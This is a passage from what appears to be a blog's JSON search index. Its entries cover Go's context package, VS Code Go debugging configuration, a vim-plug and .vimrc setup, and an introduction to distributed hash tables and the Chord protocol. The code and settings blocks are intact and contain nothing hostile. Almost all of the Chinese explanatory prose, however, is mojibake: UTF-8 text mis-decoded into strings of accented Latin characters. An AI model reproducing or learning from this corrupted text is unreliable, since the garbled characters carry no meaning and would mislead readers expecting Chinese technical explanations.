goroutineç›‘æ§ä¸­...\nç›‘æ§2 goroutineç›‘æ§ä¸­...\nç›‘æ§3 goroutineç›‘æ§ä¸­...\nå¯ä»¥äº†ï¼Œé€šçŸ¥ç›‘æ§åœæ­¢\nç›‘æ§3 ç›‘æ§é€€å‡ºï¼Œåœæ­¢äº†...\nç›‘æ§1 ç›‘æ§é€€å‡ºï¼Œåœæ­¢äº†...\nç›‘æ§2 ç›‘æ§é€€å‡ºï¼Œåœæ­¢äº†...\n\n```\n\n\nç¤ºä¾‹ä¸­å¯åŠ¨äº†3ä¸ªç›‘æ§goroutineè¿›è¡Œä¸æ–­çš„ç›‘æ§ï¼Œæ¯ä¸€ä¸ªéƒ½ä½¿ç”¨äº†Contextè¿›è¡Œè·Ÿè¸ªï¼Œå½“æˆ‘ä»¬ä½¿ç”¨cancelå‡½æ•°é€šçŸ¥å–æ¶ˆæ—¶ï¼Œè¿™3ä¸ªgoroutineéƒ½ä¼šè¢«ç»“æŸã€‚è¿™å°±æ˜¯Contextçš„æ§åˆ¶èƒ½åŠ›ï¼Œå®ƒå°±åƒä¸€ä¸ªæ§åˆ¶å™¨ä¸€æ ·ï¼ŒæŒ‰ä¸‹å¼€å…³åï¼Œæ‰€æœ‰åŸºäºè¿™ä¸ªContextæˆ–è€…è¡ç”Ÿçš„å­Contextéƒ½ä¼šæ”¶åˆ°é€šçŸ¥ï¼Œè¿™æ—¶å°±å¯ä»¥è¿›è¡Œæ¸…ç†æ“ä½œäº†ï¼Œæœ€ç»ˆé‡Šæ”¾goroutineï¼Œè¿™å°±ä¼˜é›…çš„è§£å†³äº†goroutineå¯åŠ¨åä¸å¯æ§çš„é—®é¢˜ã€‚\n\n### 2.3 æ€»ç»“\n\n\n* ä¸è¦æŠŠContextæ”¾åœ¨ç»“æ„ä½“ä¸­ï¼Œè¦ä»¥å‚æ•°çš„æ–¹å¼ä¼ é€’\n* ä»¥Contextä½œä¸ºå‚æ•°çš„å‡½æ•°æ–¹æ³•ï¼Œåº”è¯¥æŠŠContextä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ï¼Œæ”¾åœ¨ç¬¬ä¸€ä½ã€‚\n* ç»™ä¸€ä¸ªå‡½æ•°æ–¹æ³•ä¼ é€’Contextçš„æ—¶å€™ï¼Œä¸è¦ä¼ é€’nilï¼Œå¦‚æœä¸çŸ¥é“ä¼ é€’ä»€ä¹ˆï¼Œå°±ä½¿ç”¨context.TODO\n* Contextçš„Valueç›¸å…³æ–¹æ³•åº”è¯¥ä¼ é€’å¿…é¡»çš„æ•°æ®ï¼Œä¸è¦ä»€ä¹ˆæ•°æ®éƒ½ä½¿ç”¨è¿™ä¸ªä¼ é€’\n* Contextæ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼Œå¯ä»¥æ”¾å¿ƒçš„åœ¨å¤šä¸ªgoroutineä¸­ä¼ é€’\n\n","tags":["golang"],"categories":["4_golangå®æˆ˜"]},{"title":"golang_ide_vscodeçš„ä½¿ç”¨è°ƒè¯•å’Œé—®é¢˜è§£å†³","url":"%2Fp%2F127812f2.html","content":"\n\n\n### å®‰è£… vscodeåçš„plugins:\n\n1. go\n2. vscode-icons\n3. code runner\n4. markdown preview github\n5. markdown auto-open\n6. vscode snippets æ¨¡æ¿æ–‡ä»¶: [https://github.com/Microsoft/vscode-go/blob/master/snippets/go.json](https://github.com/Microsoft/vscode-go/blob/master/snippets/go.json)\n7. theme molokai è‡ªå¸¦\n  \n\n<!-- more -->\n### vscodeå¢åŠ golang debugè°ƒè¯•:\n\n1. xcode-select --install\n\n2. é’¥åŒ™é“¾åˆ›å»ºè¯ä¹¦ dlv-cert\n  \n3. è¯ä¹¦ç­¾å\n\n```    \ncd $GOPATH/src/github.com/derekparker\n    \ngit clone https://github.com/derekparker/delve.git  //è°ƒè¯• golang\n    \ncd delve\n    \nCERT=dlv-cert make install\n```\n\n\n\n\n\n### æˆ‘çš„vscodeé…ç½®æ–‡ä»¶\n\n> setting.json\n\n```\n{\n    \"files.associations\": {\n        \"*.lua.txt\": \"lua\"\n    },\n    \"files.exclude\": {\n        \"**/.git\": true,\n        \"**/.svn\": true,\n        \"**/.hg\": true,\n        \"**/CVS\": true,\n        \"**/.DS_Store\": true,\n        \"**/*.meta\": true,\n    },\n    \"files.autoSave\": \"afterDelay\",\n    \"workbench.colorTheme\": \"Monokai\",\n    \"workbench.iconTheme\": \"vscode-icons\",\n    \"workbench.editor.enablePreview\": false,\n    \"editor.fontSize\": 14,\n    \"editor.minimap.enabled\": false,\n    \"editor.formatOnType\": true,\n    \"editor.formatOnSave\": true,\n    \"extensions.autoUpdate\": false,\n    \"extensions.ignoreRecommendations\": true,\n    \"window.zoomLevel\": 0,\n    \"luaide.scriptRoots\": [\n        \"/Users/liuwei/workspace/client3-5/Assets/Resources/Lua\"\n    ],\n    \"vim.disableAnnoyingNeovimMessage\": true,\n    \"go.useLanguageServer\": true,\n    \"go.docsTool\": \"gogetdoc\",\n    \"go.buildOnSave\": true,\n    \"go.lintOnSave\": true,\n    \"go.vetOnSave\": true,\n    \"go.buildFlags\": [],\n    \"go.lintFlags\": [],\n    \"go.vetFlags\": [],\n    \"go.coverOnSave\": false,\n    \"go.useCodeSnippetsOnFunctionSuggest\": false,\n    \"go.formatOnSave\": true,\n    \"go.formatTool\": \"goreturns\",\n    \"go.goroot\": \"/usr/local/Cellar/go/1.9.2/libexec\",\n    \"go.gopath\": \"/Users/liuwei/golang\",\n}\n\n```\n\n> launch.json\n\n```\n{\n    // ä½¿ç”¨ IntelliSense äº†è§£ç›¸å…³å±æ€§ã€‚ \n    // æ‚¬åœä»¥æŸ¥çœ‹ç°æœ‰å±æ€§çš„æè¿°ã€‚\n    // æ¬²äº†è§£æ›´å¤šä¿¡æ¯ï¼Œè¯·è®¿é—®: https://go.microsoft.com/fwlink/?linkid=830387\n    \"version\": \"0.2.0\",\n    \"configurations\": [\n        {\n            \"name\": \"Launch\",\n            \"type\": \"go\",\n            \"request\": \"launch\",\n            \"mode\": \"debug\",\n            \"remotePath\": \"\",\n            \"port\": 2345,\n            \"host\": \"127.0.0.1\",\n            \"program\": \"${fileDirname}\",\n            \"env\": {},\n            \"args\": [],\n            \"showLog\": true\n        }\n    ]\n}\n```\n\n\n\n\n\n\n### vscode é‡åˆ°çš„é—®é¢˜\n\n+ flag provided but not defined: -goversion\n\nä¸€ä¸ªæ˜¯ç‰ˆæœ¬åŸå› , ä¸€ä¸ªæ˜¯vscodeä¹Ÿè¦ä¿®æ”¹é…ç½®gopath, å‘çˆ¹\n\n>Thank you, I was able to solve this by running brew uninstall --force go and then downloading the latest installer. Anyone who reads this and wants to use brew you could probably just do brew install go after the forced uninstall. I had to restart my terminal and Gogland after doing this.\n\n+ vscode not jump define\n\n```\n\"go.useLanguageServer\": true,\n\"go.docsTool\": \"gogetdoc\",\n```\n\n+ vscode could not launch process: exec: \"lldb-server\": executable file not found in $PATH\n\n```\nxcode-select --install\n```\n\n\n+ vscode jump slow\n\nå®‰è£…https://github.com/sourcegraph/go-langserver æºç å®‰è£… éœ€è¦ go install\n\n```\n\"go.useLanguageServer\": true,\n```\n\n\n+ vscode output window hide go\n\n~/.vscode/æ‰©å±•åŒ…/package.json æ‰¾åˆ°æ˜¾ç¤ºçš„\n\n```\n\"showOutput\": \"never\"\n```\n\n","tags":["golang"],"categories":["3_golangæ‚é¡¹"]},{"title":"vimæ’ä»¶ç®¡ç†_vimrcé…ç½®","url":"%2Fp%2F1b9bff9b.html","content":"\n# 1. vim-plug å®‰è£…\n\n```bash\ncurl -fLo ~/.vim/autoload/plug.vim --create-dirs \\\n    https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim\n\n# è¿›å…¥vim,  :PlugInstall æ‰§è¡Œå®‰è£…å‘½ä»¤\n```\n\n<!-- more -->\n\n# 2. æˆ‘çš„.vimrc\n\n```bash\n\" Plugin \ncall plug#begin()\nPlug 'tomasr/molokai' \"ä¸»é¢˜\nPlug 'ctrlpvim/ctrlp.vim' \"å¿«é€ŸæŸ¥æ–‡ä»¶\nPlug 'Shougo/neocomplete.vim' \"ä»£ç å®æ—¶æç¤º\nPlug 'majutsushi/tagbar' \"tagbar\nPlug 'scrooloose/nerdtree' \"å¯¼èˆªæ ‘\nPlug 'jistr/vim-nerdtree-tabs' \"å¯¼èˆªæ ‘æ’ä»¶\nPlug 'vim-airline/vim-airline' \"çŠ¶æ€æ \nPlug 'ervandew/supertab' \"supertab\nPlug 'SirVer/ultisnips' \"ä»£ç æ¨¡æ¿\nPlug 'Valloric/YouCompleteMe' \"tableè¡¥å…¨\nPlug 'easymotion/vim-easymotion' \"æé€Ÿè·³è½¬\ncall plug#end()\n\n\n\" mapping\nlet mapleader=\",\"\nset mouse=a \"å¯ä»¥ç”¨é¼ æ ‡æ‹–åŠ¨\nset clipboard=unnamed \"é¼ æ ‡é€‰ä¸­yå¤åˆ¶\n\n\n\" easymotion\nlet g:EasyMotion_smartcase = 1\nlet g:EasyMotion_startofline = 0 \" keep cursor column when JK motion\nnmap s <Plug>(easymotion-overwin-f)\nnmap s <Plug>(easymotion-overwin-f2)\nmap  / <Plug>(easymotion-sn)\nomap / <Plug>(easymotion-tn)\nmap  n <Plug>(easymotion-next)\nmap  N <Plug>(easymotion-prev)\nmap <Leader>j <Plug>(easymotion-j)\nmap <Leader>k <Plug>(easymotion-k)\nmap <Leader>w <Plug>(easymotion-w)\nmap <Leader>b <Plug>(easymotion-b)\n\n\n\n\" Color \nsyntax enable\nset t_Co=256\nlet g:rehash256 = 1\nlet g:molokai_original = 1\ncolorscheme molokai\n\n\" Ycm\n\"let g:ycm_server_use_vim_stdout = 1\n\"let g:ycm_server_log_level = 'debug'\n\" make YCM compatible with UltiSnips (using supertab)\nlet g:ycm_key_list_select_completion = ['<C-n>', '<Down>']\nlet g:ycm_key_list_previous_completion = ['<C-p>', '<Up>']\nlet g:SuperTabDefaultCompletionType = '<C-n>'\nlet g:UltiSnipsExpandTrigger = \"<tab>\"\nlet g:UltiSnipsJumpForwardTrigger = \"<tab>\"\nlet g:UltiSnipsJumpBackwardTrigger = \"<s-tab>\"\n\n\n\" Nerdtree\n\"autocmd vimenter * NERDTree \"è‡ªåŠ¨æ‰“å¼€Tree\n\"autocmd vimenter * Tagbar \"è‡ªåŠ¨æ‰“å¼€TagBar\nnmap <F7> :NERDTreeToggle<CR>\nnmap <F8> :TagbarToggle<CR>\nlet NERDTreeWinSize=20 \"è®¾ç½®nerdtreeå®½åº¦\nlet g:tagbar_width=20 \"è®¾ç½®å®½åº¦ï¼Œé»˜è®¤ä¸º40\n\"let g:nerdtree_tabs_open_on_console_startup=1 \"å¯åŠ¨æ‰“å¼€nerdtree\nlet g:neocomplete#enable_at_startup = 1 \"ä»£ç å®æ—¶æç¤º\n\"let NERDTreeQuitOnOpen=1 \"æ‰“å¼€æ–‡ä»¶åè‡ªåŠ¨å…³é—­çª—å£\n\n\" æ‰“å¼€NERDTree,å®šä½åˆ°å½“å‰æ–‡ä»¶\nnoremap <silent> <Leader>f :NERDTreeFind<cr> \n\"æ‰“å¼€tagbarçª—å£,è·³è½¬åè‡ªåŠ¨å…³é—­,qä¸è·³è½¬ç›´æ¥å…³é—­\nnoremap <silent> <Leader>g :TagbarOpen fjc<cr> \n\" NERDTree tab switch\nmap  <C-l> :tabn<CR>\nmap  <C-h> :tabp<CR>\nmap  <C-o> :tabnew<CR>\n\n\n\" config\nset tabstop=4                   \" è®¾å®štabé•¿åº¦ä¸º4\nset shiftwidth=4                \" ç¼©è¿›çš„ç©ºæ ¼æ•°ä¸º4\n\nfiletype off                    \" Reset filetype detection first ...\nfiletype plugin indent on       \" ... and enable filetype detection\nset nocompatible                \" Enables us Vim specific features\nset ttyfast                     \" Indicate fast terminal conn for faster \nset ttymouse=xterm2             \" Indicate terminal type for mouse codes\nset ttyscroll=3                 \" Speedup scrolling\nset laststatus=2                \" Show status line always\nset encoding=utf-8              \" Set default encoding to UTF-8\nset autoread                    \" Automatically read changed files\nset autoindent                  \" Enabile Autoindent\nset backspace=indent,eol,start  \" Makes backspace key more powerful.\nset incsearch                   \" Shows the match while typing\nset hlsearch                    \" Highlight found searches\nset noerrorbells                \" No beeps\nset number                      \" Show line numbers\nset showcmd                     \" Show me what I'm typing\nset noswapfile                  \" Don't use swapfile\nset nobackup                    \" Don't create annoying backup files\nset splitright                  \" Vertical windows should be split to right\nset splitbelow                  \" Horizontal windows should split to bottom\nset autowrite                   \" Automatically save before :next, :make etc.\nset hidden                      \" Buffer still exist if window is closed\nset fileformats=unix,dos,mac    \" Prefer Unix over Windows over OS 9 formats\nset noshowmatch                 \" Do not show matching brackets by flickering\nset noshowmode                  \" We show the mode with airline or lightline\nset ignorecase                  \" Search case insensitive...\nset smartcase                   \" but not it begins with upper case\nset completeopt=menu,menuone    \" Show popup menu, even if there is one entry\nset pumheight=10                \" Completion window max size\nset nocursorcolumn              \" Dont highlight column\nset nocursorline                \" Dont highlight cursor\nset lazyredraw                  \" Wait to redraw\nset cursorcolumn\n```\n\n\n\n# 3. vimé…ç½®\n\n### 3.1 vim æ‹·è´åˆ°ç³»ç»Ÿå‰ªè´´æ¿\n\n1. which vimå¯ä»¥çœ‹åˆ°å½“å‰ä½¿ç”¨çš„vimæ˜¯å“ªä¸ªï¼Œvim --versionå¯ä»¥çœ‹åˆ°å½“å‰ä½¿ç”¨çš„vimæ”¯æŒå“ªäº›featureï¼Œ'+'å‰ç¼€è¡¨ç¤ºæ‹¥æœ‰çš„featureï¼Œ'-'å‰ç¼€è¡¨ç¤ºæœªæ‹¥æœ‰ï¼›\n\n2. '+clipboard'æ˜¯æ”¯æŒä½¿ç”¨ç³»ç»Ÿå‰ªåˆ‡æ¿çš„featureï¼›å¦‚æœä½ å½“å‰ä½¿ç”¨çš„vimä¸æ”¯æŒclipboardï¼Œé‚£éœ€è¦brew upgrade vimè£…ä¸€ä¸ªæ–°çš„ï¼›\n\n3. å®‰è£…æ–°çš„ä»¥åï¼Œè¦æŠŠè¿™ä¸ªæ–°çš„vimè®¾ç½®ä¸ºé»˜è®¤vimï¼Œé€šå¸¸ä½¿ç”¨aliasè®¾ç½®ä¸€ä¸‹åˆ«åï¼Œæˆ–è€…é€šè¿‡ç¯å¢ƒå˜é‡è®¾ç½®ï¼Œæˆ–è€…åˆ æ‰æ—§çš„ï¼Œåšä¸ªè½¯è¿æ¥ï¼›\n\n4. ç¡®è®¤+clipboardä»¥åï¼Œåœ¨.vimrcæ–‡ä»¶ä¸­åŠ å…¥set clipboard=unamedï¼Œå°±å¯ä»¥åœ¨vimä¸­ä½¿ç”¨ç³»ç»Ÿå‰ªåˆ‡æ¿äº†\n\n\n","tags":["vim"],"categories":["vim"]},{"title":"dhtåˆ†å¸ƒå¼æ•£åˆ—è¡¨å’Œkadä»‹ç»","url":"%2Fp%2F2c46e603.html","content":"\n\n### 1. å¦‚ä½•å®ç°æ•£åˆ—è¡¨\n\n+ åœ¨æ•£åˆ—è¡¨è¿™ç§æ•°æ®ç»“æ„ä¸­ï¼Œä¼šåŒ…å« N ä¸ª bucketï¼ˆæ¡¶ï¼‰ã€‚å¯¹äºæŸä¸ªå…·ä½“çš„æ•£åˆ—è¡¨ï¼ŒNï¼ˆæ¡¶çš„æ•°é‡ï¼‰é€šå¸¸æ˜¯ã€å›ºå®šä¸å˜ã€‘çš„ã€‚äºæ˜¯å¯ä»¥å¯¹æ¯ä¸ªæ¡¶è¿›è¡Œç¼–å·ï¼Œä» 0 åˆ° N-1ã€‚\n\n+ â€œæ¡¶â€æ˜¯ç”¨æ¥å­˜å‚¨â€œé”®å€¼å¯¹â€çš„ï¼Œä½ å¯ä»¥æŠŠå®ƒé€šä¿—ç†è§£æˆä¸€ä¸ªåŠ¨æ€æ•°ç»„ï¼Œé‡Œé¢å¯ä»¥å­˜æ”¾ã€å¤šä¸ªã€‘â€œé”®å€¼å¯¹â€ã€‚\n\n+ å½“ä½¿ç”¨æŸä¸ª key è¿›è¡ŒæŸ¥æ‰¾ï¼Œä¼šå…ˆç”¨æŸä¸ªæ•£åˆ—å‡½æ•°è®¡ç®—è¿™ä¸ª key çš„æ•£åˆ—å€¼ã€‚å¾—åˆ°æ•£åˆ—å€¼é€šå¸¸æ˜¯ä¸€ä¸ªæ•´æ•°ï¼Œç„¶åç”¨æ•£åˆ—å€¼å¯¹ Nï¼ˆæ¡¶æ•°ï¼‰è¿›è¡Œâ€œå–æ¨¡â€è¿ç®—ï¼ˆé™¤æ³•æ±‚ä½™æ•°ï¼‰ï¼Œå°±å¯ä»¥ç®—å‡ºå¯¹åº”çš„æ¡¶ç¼–å·ã€‚ï¼ˆæ³¨ï¼šå–æ¨¡è¿ç®—æ˜¯æœ€å¸¸ç”¨çš„åšæ³•ï¼Œä½†ä¸æ˜¯å”¯ä¸€çš„åšæ³•ï¼‰\n\n<!-- more -->\n\n### 2. åˆ†å¸ƒå¼æ•£åˆ—è¡¨ DHT\n\n##### 2.1 P2P æŠ€æœ¯è·¯çº¿\n\n- ä¸­å¤®æœåŠ¡å™¨  Napster  ->å•ç‚¹æ•…éšœ\n- å¹¿æ’­   Gnutella æ—©æœŸç‰ˆæœ¬ ->å¹¿æ’­é£æš´\n- DHT\n\n##### 2.2 DHT éš¾ç‚¹\n\n- æ— ä¸­å¿ƒ \n\t\n\téœ€è¦æä¾›ä¸€ç³»åˆ—æœºåˆ¶æ¥å®ç°èŠ‚ç‚¹ä¹‹é—´çš„é€šè®¯ã€‚\n- æµ·é‡æ•°æ® \n\t\n\tæ¯ä¸ªèŠ‚ç‚¹åªèƒ½å­˜å‚¨ï¼ˆæ•´ä¸ªç³»ç»Ÿçš„ï¼‰ä¸€å°éƒ¨åˆ†æ•°æ®ã€‚éœ€è¦æŠŠæ•°æ®ã€å‡åŒ€åˆ†æ‘Šã€‘åˆ°æ¯ä¸ªèŠ‚ç‚¹ã€‚\n- èŠ‚ç‚¹åŠ¨æ€å˜åŒ–  \n\n\tç»Ÿæ•£åˆ—è¡¨æ‰€å«çš„ã€æ¡¶æ•°ã€‘æ˜¯å›ºå®šä¸å˜æ»´ã€‚ä¸ºå•¥æï¼Ÿå› ä¸ºä¼ ç»Ÿæ•£åˆ—è¡¨åœ¨é’ˆå¯¹ key è®¡ç®—å‡ºæ•£åˆ—å€¼ä¹‹åï¼Œéœ€è¦ç”¨â€œæ•£åˆ—å€¼â€å’Œâ€œæ¡¶æ•°â€è¿›è¡ŒæŸç§è¿ç®—ï¼ˆæ¯”å¦‚ï¼šå–æ¨¡è¿ç®—ï¼‰ï¼Œä»è€Œå¾—åˆ°æ¡¶çš„ç¼–å·ã€‚å¦‚æœæ¡¶çš„æ•°é‡å‡ºç°å˜åŒ–ï¼Œå°±ä¼šå½±å“åˆ°ä¸Šè¿°â€œå–æ¨¡è¿ç®—â€çš„ç»“æœï¼Œç„¶åå¯¼è‡´æ•°æ®é”™ä¹±ã€‚\n\n- é«˜æ•ˆæŸ¥è¯¢\n\n##### 2.3 DHT éš¾ç‚¹è§£å†³\n\n- æ•£åˆ—ç®—æ³•çš„é€‰æ‹©\n\n\tDHTä¸šåŠ¡æ•°æ®çš„æ•£åˆ—å€¼ä½œä¸ºKey,ä¸šåŠ¡æ•°æ®ä¸ºValue, æ‰€ä»¥è¦é¿å…ç¢°æ’\n\n- åŒæ„çš„ nodeID å’Œ data key\n\n\tDHT å±äºåˆ†å¸ƒå¼ç³»ç»Ÿçš„ä¸€ç§ã€‚æ—¢ç„¶æ˜¯åˆ†å¸ƒå¼ç³»ç»Ÿï¼Œæ„å‘³ç€å­˜åœ¨ã€å¤šä¸ªã€‘èŠ‚ç‚¹\n\t\n\tå¾ˆå¤š DHT çš„è®¾è®¡ä¼šè®©â€œnode IDâ€é‡‡ç”¨è·Ÿâ€œdata keyâ€ã€åŒæ„ã€‘çš„æ•£åˆ—å€¼ã€‚è¿™ä¹ˆæçš„å¥½å¤„æ˜¯\n\t1ã€å½“æ•£åˆ—å€¼ç©ºé—´è¶³å¤Ÿå¤§çš„æ—¶å€™ï¼Œéšæœºç¢°æ’å¿½ç•¥ä¸è®¡ï¼Œå› æ­¤ä¹Ÿå°±ç¡®ä¿äº† node ID çš„å”¯ä¸€æ€§ 2ã€å¯ä»¥ç®€åŒ–ç³»ç»Ÿè®¾è®¡â€”â€”æ¯”å¦‚ç®€åŒ–è·¯ç”±ç®—æ³•\n\t\n- â€œæ‹“æ‰‘ç»“æ„â€çš„è®¾è®¡\n\n\tä½œä¸ºåˆ†å¸ƒå¼ç³»ç»Ÿï¼ŒDHT å¿…ç„¶è¦å®šä¹‰æŸç§æ‹“æ‰‘ç»“æ„ï¼›æœ‰äº†æ‹“æ‰‘ç»“æ„ï¼Œè‡ªç„¶å°±è¦è®¾è®¡æŸç§â€œè·¯ç”±ç®—æ³•â€ã€‚å¦‚æœæŸä¸ª DHT é‡‡ç”¨å‰é¢æ‰€è¯´çš„â€”â€”â€œnode IDâ€ä¸â€œdata keyâ€ã€åŒæ„ã€‘â€”â€”é‚£ä¹ˆå¾ˆè‡ªç„¶çš„å°±ä¼šå¼•å…¥â€œKey-based routingâ€ã€‚\n\t\n\tè¯·æ³¨æ„ï¼Œè¿™ã€ä¸æ˜¯ã€‘æŸä¸ªå…·ä½“çš„è·¯ç”±ç®—æ³•ï¼Œè€Œåªæ˜¯æŸç§ã€é£æ ¼ã€‘ã€‚é‡‡ç”¨è¿™ç§é£æ ¼æ¥è®¾è®¡è·¯ç”±æœºåˆ¶ï¼Œå¥½å¤„æ˜¯ï¼škey æœ¬èº«å·²ç»æä¾›äº†è¶³å¤Ÿå¤šçš„è·¯ç”±ä¿¡æ¯ã€‚\n\n- â€œè·¯ç”±ç®—æ³•â€çš„æƒè¡¡\n\n  ç”±äº DHT ä¸­çš„èŠ‚ç‚¹æ•°å¯èƒ½éå¸¸å¤šï¼ˆæ¯”å¦‚ï¼šå‡ åä¸‡ã€å‡ ç™¾ä¸‡ï¼‰ï¼Œè€Œä¸”è¿™äº›èŠ‚ç‚¹æ˜¯åŠ¨æ€å˜åŒ–çš„ã€‚å› æ­¤å°±ã€ä¸å¯èƒ½ã€‘è®©æ¯ä¸€ä¸ªèŠ‚ç‚¹éƒ½è®°å½•æ‰€æœ‰å…¶å®ƒèŠ‚ç‚¹çš„ä¿¡æ¯ã€‚å®é™…æƒ…å†µæ˜¯ï¼šæ¯ä¸ªèŠ‚ç‚¹é€šå¸¸åªçŸ¥é“å°‘æ•°ä¸€äº›èŠ‚ç‚¹çš„ä¿¡æ¯ã€‚\n\n  åœ¨ç¡®å®šäº†è·¯ç”±ç®—æ³•ä¹‹åï¼Œè¿˜éœ€è¦åšä¸€ä¸ªä¸¤éš¾çš„æƒè¡¡â€”â€”â€œè·¯ç”±è¡¨çš„å¤§å°â€ã€‚\n  è·¯ç”±è¡¨è¶Šå¤§ï¼Œå¯ä»¥å®ç°è¶ŠçŸ­ï¼ˆè·³æ•°è¶Šå°‘ï¼‰çš„è·¯ç”±ï¼›ç¼ºç‚¹æ˜¯ï¼šï¼ˆç”±äºèŠ‚ç‚¹åŠ¨æ€å˜åŒ–ï¼‰è·¯ç”±è¡¨çš„ç»´æŠ¤æˆæœ¬ä¹Ÿå°±è¶Šé«˜ã€‚\n  è·¯ç”±è¡¨æ•°è¶Šå°ï¼Œå…¶ç»´æŠ¤æˆæœ¬è¶Šå°ï¼›ç¼ºç‚¹æ˜¯ï¼šè·¯ç”±å°±ä¼šå˜é•¿ï¼ˆè·³æ•°å˜å¤šï¼‰ã€‚\n\n- è·ç¦»ç®—æ³•\n\n   æŸäº› DHT ç³»ç»Ÿè¿˜ä¼šå®šä¹‰ä¸€ç§â€œè·ç¦»ç®—æ³•â€ï¼Œç”¨æ¥è®¡ç®—ï¼šâ€œèŠ‚ç‚¹ä¹‹é—´çš„è·ç¦»â€ã€â€œæ•°æ®ä¹‹é—´çš„è·ç¦»â€ã€â€œèŠ‚ç‚¹ä¸æ•°æ®çš„è·ç¦»â€ã€‚\n\n   å†™åˆ°è¿™é‡Œï¼ŒæŸäº›èªæ˜çš„è¯»è€…å°±ä¼šæ˜ç™½ï¼šä¸ºå•¥å‰é¢è¦å¼ºè°ƒâ€”â€”â€œnode IDâ€ä¸â€œdata keyâ€ã€åŒæ„ã€‘ã€‚å½“è¿™ä¸¤è€…ã€åŒæ„ã€‘ï¼Œå°±å¯ä»¥ä½¿ç”¨ã€åŒä¸€ç§â€œè·ç¦»ç®—æ³•â€ã€‘ï¼›åä¹‹ï¼Œå¦‚æœè¿™ä¸¤è€…ä¸åŒæ„ï¼Œå¤šåŠè¦å¼•å…¥å‡ ç§ä¸åŒçš„â€œè·ç¦»ç®—æ³•â€ã€‚\n\n- æ•°æ®å®šä½\n\n\t+ ä¿å­˜æ•°æ®\n\t\t\n\t\tå½“æŸä¸ªèŠ‚ç‚¹å¾—åˆ°äº†æ–°åŠ å…¥çš„æ•°æ®ï¼ˆK/Vï¼‰ï¼Œå®ƒä¼šå…ˆè®¡ç®—è‡ªå·±ä¸æ–°æ•°æ®çš„ key ä¹‹é—´çš„â€œè·ç¦»â€ï¼›ç„¶åå†è®¡ç®—å®ƒæ‰€çŸ¥é“çš„å…¶å®ƒèŠ‚ç‚¹ä¸è¿™ä¸ª key çš„è·ç¦»ã€‚\n\t\t\n\t\tå¦‚æœè®¡ç®—ä¸‹æ¥ï¼Œè‡ªå·±ä¸ key çš„è·ç¦»æœ€å°ï¼Œé‚£ä¹ˆè¿™ä¸ªæ•°æ®å°±ä¿æŒåœ¨è‡ªå·±è¿™é‡Œã€‚å¦åˆ™çš„è¯ï¼ŒæŠŠè¿™ä¸ªæ•°æ®è½¬å‘ç»™è·ç¦»æœ€å°çš„èŠ‚ç‚¹ã€‚æ”¶åˆ°æ•°æ®çš„å¦ä¸€ä¸ªèŠ‚ç‚¹ï¼Œä¹Ÿé‡‡ç”¨ä¸Šè¿°è¿‡ç¨‹è¿›è¡Œå¤„ç†ï¼ˆé€’å½’å¤„ç†ï¼‰ã€‚\n\n\t+ è·å–æ•°æ®\n\n\t   å½“æŸä¸ªèŠ‚ç‚¹æ¥æ”¶åˆ°æŸ¥è¯¢æ•°æ®çš„è¯·æ±‚ï¼ˆkeyï¼‰ï¼Œå®ƒä¼šå…ˆè®¡ç®—è‡ªå·±ä¸ key ä¹‹é—´çš„â€œè·ç¦»â€ï¼›ç„¶åå†è®¡ç®—å®ƒæ‰€çŸ¥é“çš„å…¶å®ƒèŠ‚ç‚¹ä¸è¿™ä¸ª key çš„è·ç¦»ã€‚\n\t\n\t  å¦‚æœè®¡ç®—ä¸‹æ¥ï¼Œè‡ªå·±ä¸ key çš„è·ç¦»æœ€å°ï¼Œé‚£ä¹ˆå°±åœ¨è‡ªå·±è¿™é‡Œæ‰¾æœ‰æ²¡æœ‰ key å¯¹åº”çš„ valueã€‚æœ‰çš„è¯å°±è¿”å› valueï¼Œæ²¡æœ‰çš„è¯å°±æŠ¥é”™ã€‚å¦åˆ™çš„è¯ï¼ŒæŠŠè¿™ä¸ªæ•°æ®è½¬å‘ç»™è·ç¦»æœ€å°çš„èŠ‚ç‚¹ã€‚æ”¶åˆ°æ•°æ®çš„å¦ä¸€ä¸ªèŠ‚ç‚¹ï¼Œä¹Ÿé‡‡ç”¨ä¸Šè¿°è¿‡ç¨‹è¿›è¡Œå¤„ç†ï¼ˆé€’å½’å¤„ç†ï¼‰ã€‚\n\n### 3. Chord åè®®\n\n+ æ¦‚è¿°\n\nChord è¯ç”Ÿäº2001å¹´ã€‚ç¬¬ä¸€æ‰¹ DHT åè®®éƒ½æ˜¯åœ¨é‚£å¹´æ¶Œç°çš„ï¼Œå¦å¤–å‡ ä¸ªæ˜¯ï¼šCANã€Tapestryã€Pastryã€‚\n\n\n+ æ‹“æ‰‘ç»“æ„â€”â€”ç¯å½¢\n\t\n\tå½“åˆè®¾è®¡â€œä¸€è‡´æ•£åˆ—â€ä¸»è¦æ˜¯ä¸ºäº†è§£å†³â€œèŠ‚ç‚¹åŠ¨æ€å˜åŒ–â€è¿™ä¸ªéš¾ç‚¹ï¼ˆå‰é¢æœ‰æåŠï¼‰ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªéš¾ç‚¹ï¼Œâ€œä¸€è‡´æ•£åˆ—â€æŠŠæ•£åˆ—å€¼ç©ºé—´ï¼ˆkeyspaceï¼‰æ„æˆä¸€ä¸ªã€ç¯ã€‘ã€‚å¯¹äº m æ¯”ç‰¹çš„æ•£åˆ—å€¼ï¼Œå…¶èŒƒå›´æ˜¯ [0, 2m-1]ã€‚ä½ æŠŠè¿™ä¸ªåŒºé—´å¤´å°¾ç›¸æ¥å°±å˜æˆä¸€ä¸ªç¯ï¼Œå…¶å‘¨é•¿æ˜¯ 2mã€‚ç„¶åå¯¹è¿™ä¸ªç¯è§„å®šäº†ä¸€ä¸ªç§»åŠ¨æ–¹å‘ï¼ˆæ¯”å¦‚é¡ºæ—¶é’ˆï¼‰ã€‚\n\t\n\t\n\tå‡è®¾æœ‰æŸä¸ªèŠ‚ç‚¹Aï¼Œè·ç¦»å®ƒæœ€è¿‘çš„æ˜¯èŠ‚ç‚¹Bï¼ˆä»¥é¡ºæ—¶é’ˆæ–¹å‘è¡¡é‡è·ç¦»ï¼‰ã€‚é‚£ä¹ˆç§° B æ˜¯ A çš„ã€ç»§ä»»ã€‘ï¼ˆsuccessorï¼‰ï¼ŒA æ˜¯ B çš„ã€å‰ä»»ã€‘ï¼ˆpredecessorï¼‰ã€‚\n\n\t```\n\tæ•°æ®éš¶å±äºã€è·ç¦»æœ€å°ã€‘çš„èŠ‚ç‚¹ã€‚ä»¥ m=6 